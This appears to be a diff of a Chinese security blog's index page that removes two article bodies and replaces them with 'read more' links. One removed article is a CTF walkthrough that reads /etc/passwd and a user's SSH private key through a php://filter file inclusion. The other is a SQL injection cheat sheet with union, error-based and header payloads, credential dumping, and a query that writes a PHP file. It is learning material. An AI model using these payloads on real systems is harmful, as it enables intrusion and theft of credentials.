@@ -248,31 +248,10 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="pentest"><a href="#pentest" class="headerlink" title="pentest"></a>pentest</h1><h3 id="获取ssh私钥"><a href="#获取ssh私钥" class="headerlink" title="获取ssh私钥"></a>获取ssh私钥</h3><p>（dvctf  <a target="_blank" rel="noopener" href="https://dvc.tf/challenges%EF%BC%89">https://dvc.tf/challenges）</a></p>
-<ol>
-<li><p>扫描端口</p>
-<p>nmap -A challs.dvc.tf -p51000- 52000</p>
-</li>
-<li><p>配合phpfilter可以一次读取出全部的文件内容</p>
-</li>
-<li><p>读出代码,发现无可利用点</p>
-</li>
-<li><p>读&#x2F;etc&#x2F;passwd, 收集目标主机的用户 </p>
-<p>view-source:challs.dvc.tf:51080&#x2F;?    MyTop5&#x3D;1&amp;playlistTop&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;etc&#x2F;passwd</p>
-</li>
-<li><p>然后尝试读取ssh的私钥,发现可以读到leonardo的私钥 &#x2F;home&#x2F;leonardo&#x2F;.ssh&#x2F;id_rsa</p>
-</li>
-<li><p>在Linux桌面建立文件.\id_rsa.txt，写入私钥</p>
-</li>
-<li><p>用私钥登录服务器</p>
-<p>ssh <a href="mailto:&#x6c;&#x65;&#x6f;&#x6e;&#97;&#114;&#x64;&#111;&#x40;&#99;&#104;&#x61;&#x6c;&#x6c;&#x73;&#46;&#x64;&#118;&#x63;&#x2e;&#116;&#x66;">&#x6c;&#x65;&#x6f;&#x6e;&#97;&#114;&#x64;&#111;&#x40;&#99;&#104;&#x61;&#x6c;&#x6c;&#x73;&#46;&#x64;&#118;&#x63;&#x2e;&#116;&#x66;</a> -p51022 -i .\id_rsa.txt</p>
-</li>
-<li><p>ls</p>
-</li>
-<li><p>cat …flag.txt</p>
-</li>
-</ol>
-
+        <h1 id="pentest"><a href="#pentest" class="headerlink" title="pentest"></a>pentest</h1><h3 id="获取ssh私钥"><a href="#获取ssh私钥" class="headerlink" title="获取ssh私钥"></a>获取ssh私钥</h3>
+        
+          <a class="article-more-a" href="/2022/03/22/Pentest/#more">more >></a>
+        
       
 
       
@@ -346,109 +325,9 @@
     <div class="article-entry" itemprop="articleBody">
       
         <h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>在构建代码时，一般会从如下几个方面的策略来防止SQL注入漏洞：<br>1.对传进SQL语句里面的变量进行过滤，不允许危险字符传入；<br>2.使用参数化（Parameterized Query 或 Parameterized Statement）；<br>3.还有就是,目前有很多ORM框架会自动使用参数化解决注入问题,但其也提供了”拼接”的方式,所以使用时需要慎重!</p>
-<h3 id="如何去判断-SQL注入漏洞"><a href="#如何去判断-SQL注入漏洞" class="headerlink" title="如何去判断 SQL注入漏洞"></a><em><strong>如何去判断 SQL注入漏洞</strong></em></h3><ul>
-<li>and 1&#x3D;1 &#x2F; and 1&#x3D;2 回显页面不同</li>
-<li>单引号判断 ‘ 显示数据库错误信息或者页面回显不同</li>
-<li>\ (转义符)</li>
-<li>-1&#x2F;+1 回显下一个或上一个页面</li>
-<li>and sleep(5)</li>
-</ul>
-<h3 id="分类："><a href="#分类：" class="headerlink" title="分类："></a>分类：</h3><p>UNION query SQL injection（可联合查询注入）<br>Error-based SQL injection（报错型注入）<br>Boolean-based blind SQL injection（布尔型注入）<br>Time-based blind SQL injection（基于时间延迟注入）<br>Stacked queries SQL injection（可多语句查询注入）</p>
-<p><strong>select * * from member where username&#x3D;’  ‘</strong></p>
-<h3 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h3><ol>
-<li><p>通过联合查询来查询指定的数据，比如下面的语句</p>
-<p>select 字段1,字段2 from user where id&#x3D;1 union select 字段1,字段2 from 表名</p>
-<p>联合查询的字段数,列需要和主查询一致。</p>
-<p>通过select database(); select user(); select version(); 查询数据库的数据库、用户和版本信息。</p>
-<p> 用 order by 来帮助我们猜测后台查询语句查询的字段数select 字段1,字段2 from users order by 1；后面跟着的数字表示根据查询结果的第几列进行排序，</p>
-</li>
-<li><p>用 order by 确认主查询<strong>有多少个列</strong> 依次输入以下代码在对话框。</p>
-<p><strong>id&#x3D;1 order by 1#</strong> (改变order by 后面的1)</p>
-</li>
-<li><p>判断<strong>显示位</strong></p>
-<p><strong>url?id&#x3D;-1 union select 1,2,3,4,5</strong></p>
-</li>
-<li><p>通过’ union select database(),user() # 获得当前<strong>数据库名称和用户</strong>：(在显示位输入database)</p>
-<p><strong>url?id&#x3D;-1’union select 1,2,3,database()</strong></p>
-<p> url?id&#x3D;-1 union select 1,2,databaes(),4,5<br> url?id&#x3D;-1 union select 1,2,user(),4,5</p>
-</li>
-<li><p>列出<strong>所有数据库</strong></p>
-<p>limit 一个一个打印出来库名<br>select SCHEMA_NAME from information_schema.SCHEMATA limit 0,1<br>group_concat 一次性全部显示<br><strong>id &#x3D;-1 union select 1,group_concat(schema_name)from information_schema.schemata</strong></p>
-</li>
-<li><p>获取<strong>表名：</strong><br>limit 一个一个打印出来字段名<br>select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA&#x3D;‘test’<br>limit 0,1</p>
-<p>group_concat 一次性全部显示<br>select group_concat(TABLE_NAME) from information_schema.TABLES where<br>TABLE_SCHEMA&#x3D;0x674657374</p>
-</li>
-</ol>
-<p>​       <strong>id&#x3D;-1 union select 1,group_concat(table_name) from information_schema.tables where</strong>      </p>
-<p>​       <strong>table_schema&#x3D;’数据库名’ #</strong></p>
-<ol start="7">
-<li><p><strong>字段</strong></p>
-<p>limit 一个一个打印出来<br>select COLUMN_NAME from information_schema.COLUMNS where<br>TABLE_SCHEMA&#x3D;‘baji’ and TABLE_NAME&#x3D;‘users’ limit 0,1<br>group_concat 一次性全部显示<br><strong>id&#x3D;-1 union select1,group_concat(COLUMN_NAME) from information_schema.COLUMNS where</strong><br><strong>TABLE_SCHEMA&#x3D;……………… and TABLE_NAME&#x3D;………….</strong></p>
-<p>id&#x3D;-1 union select 1,group_concat(表名) from 数据库名.表名</p>
-</li>
-<li><p><strong>列出数据</strong></p>
-<p>limit 一个一个打印出来<br>select username,passwd from test.admin limit 0,1<br>group_concat 把 一次性全部打印<br>select group_concat(concat(username,0x20,passwd)) from test.admin<br>network</p>
-</li>
-<li><p><strong>列数</strong></p>
-</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name=1&#x27; union select 1,2,3,4 %23 &amp;pw=123</span><br><span class="line">1 union select 1,flag from ctfhub.flag #</span><br></pre></td></tr></table></figure>
-
-<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>1**.数据库**</p>
-<p>​     id&#x3D;1 union select updatexml(1,concat(0x7e,database(),0x7e),1);</p>
-<p>2.<strong>表名</strong></p>
-<p>​    id&#x3D;1 union select updatexml(1,concat(0x7e, (select(group_concat(table_name))from     information_schema.tables where table_schema&#x3D;”…”) ,0x7e),1);</p>
-<p>3**.列名**</p>
-<p>​    id&#x3D;1 union select updatexml(1,concat(0x7e, (select(group_concat(column_name))from information_schema.columns where table_name&#x3D;”…”) ,0x7e),1);</p>
-<p>4.<strong>内容</strong></p>
-<p>   id&#x3D;1 union select updatexml(1,concat(0x7e, (select(group_concat(列名)) from 库名.表名) ,0x7e),1);</p>
-<p>​              <em>然而由于回显长度的限制，没有完全返回所有值，使用right函数让后半部分的内容回显出来</em></p>
-<p>​    id&#x3D;1 union select updatexml(1,concat(0x7e, right((select(group_concat(flag)) from sqli.flag) ,31),0x7e),1);</p>
-<h3 id="insert-语句"><a href="#insert-语句" class="headerlink" title="insert 语句"></a>insert 语句</h3><p>是指我们前端注册的信息，后台会通过 insert 这个操作插入到数据库中。如果后台没对我们的输入做防 SQL 注入处理，我们就能在注册时通过拼接 SQL 注入</p>
-<p>我们一般可以通过 <strong>or</strong> 进行闭合。猜测一下后端代码可能是<br> insert into member(username,pw,sex,phonenum,email,adderss) values(‘xiaohong’,22);</p>
-<p>1.数据库</p>
-<pre><code>  1&#39; and updatexml(1,concat(0x7e,database()),1) or &#39;1&#39; = &#39;1
-</code></pre>
-<p>   或   xiaohong’ or updatexml(1, concat(0x7e,database()), 0) or ‘</p>
-<p>2.信息</p>
-<p>​      1’ and updatexml(1,concat(0x7e,（select(concat_ws(0x7e,username,password)） from pikachu.users limit0,1)),1) or ‘1’ &#x3D; ‘1</p>
-<h3 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h3><p>实际上就是传递了一个留言的 <strong>id，</strong>后台根据这个 id 去删除留言，并且我们可以看出来这是一个数字型的，这样我们可以构造的 payload。</p>
-<h6 id="1-or-updatexml-1-concat-0x7e-database-0"><a href="#1-or-updatexml-1-concat-0x7e-database-0" class="headerlink" title="1 or updatexml(1, concat(0x7e,database()), 0)"></a>1 or updatexml(1, concat(0x7e,database()), 0)</h6><p> 因为参数是通过URL提交的，所以要对闭合代码进行URL编码</p>
-<h3 id="http-header注入"><a href="#http-header注入" class="headerlink" title="http header注入"></a>http header注入</h3><p>1.把User-Agent的信息修改为单引号，右边的Response会报错，说明存在着一个SQL注入</p>
-<p>2.修改user-agent</p>
-<p>​         1’ or updatexml(1,concat(0x7e,database()),0) or ‘</p>
-<p>  或者cookie完成注入</p>
-<p>​        1’ and updatexml(1, concat( 0x7e,version()) ,0)#</p>
-<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><h4 id="boolian"><a href="#boolian" class="headerlink" title="boolian"></a>boolian</h4><h4 id="time"><a href="#time" class="headerlink" title="time"></a>time</h4><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><p><strong>updatexml()：</strong> MySQL 对 XML 文档数据进行查询和修改的 XPATH 函数  替换</p>
-<pre><code>   UPDATEXML (XML_document, XPath_string, new_value)
-</code></pre>
-<p> 第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br> 第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。不过这里用不到。<br> 第三个参数：new_value，String格式，替换查找到的符合条件的数据</p>
-<p> **extractvalue()**：MySQL 对 XML 文档数据进行查询的 XPATH 函数           查询</p>
-<p>   ExtractValue(xml_document, XPathstring)<br> 第一个参数：xml_document 是 string 格式，为 XML 文档对象的名称<br> 第二个参数： XPathstring，XPath 格式的字符串</p>
-<p> <strong>floor()：</strong>MySQL中用来取整的函数</p>
-<p><strong>load_file( )函数</strong> 读文件操作</p>
-<p><a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=UNION&spm=1001.2101.3001.7020">UNION</a> SELECT 1,load_file(’&#x2F;etc&#x2F;passwd’),3,4,5,6#<br>UNION SELECT 1,load_file(0x2f6574632f706173737764),3,4,5,6#</p>
-<p>**into outfile( )**写文件操作</p>
-<p>SELECT ‘<?php phpinfo(); ?>’ into outfile ‘c:\Windows\tmp\1.php’</p>
-<p><strong>连接字符串函数</strong></p>
-<ul>
-<li>concat(str1,str2)</li>
-<li>concat_ws(separator, str1,str2…)</li>
-<li>group_concat(str1,str2…)</li>
-</ul>
-<p><strong>常用函数</strong></p>
-<ul>
-<li>user()</li>
-<li>database()</li>
-<li>@@version</li>
-<li>session_user()</li>
-<li>@@basedir</li>
-<li>@@datadir</li>
-<li>@@version_compile_os</li>
-</ul>
-<h4 id="MySQL中information-scheme库"><a href="#MySQL中information-scheme库" class="headerlink" title="MySQL中information_scheme库"></a>MySQL中information_scheme库</h4><p><em><strong>SCHEMATA表</strong></em>  数据库<br>字段：SCHEMA_NAME<br><em><strong>TABLES表</strong></em><br>字段：TABLE_SCHEMA（数据库）， TABLE_NAME（表名）<br><em><strong>COLUMNS表</strong></em><br>字段：TBALE_SCHEMA,TABLE_NAME,COLUMN_NAME</p>
-<p>- </p>
-
+        
+          <a class="article-more-a" href="/2022/03/22/SQL-inject/#more">more >></a>
+        
       
 
       
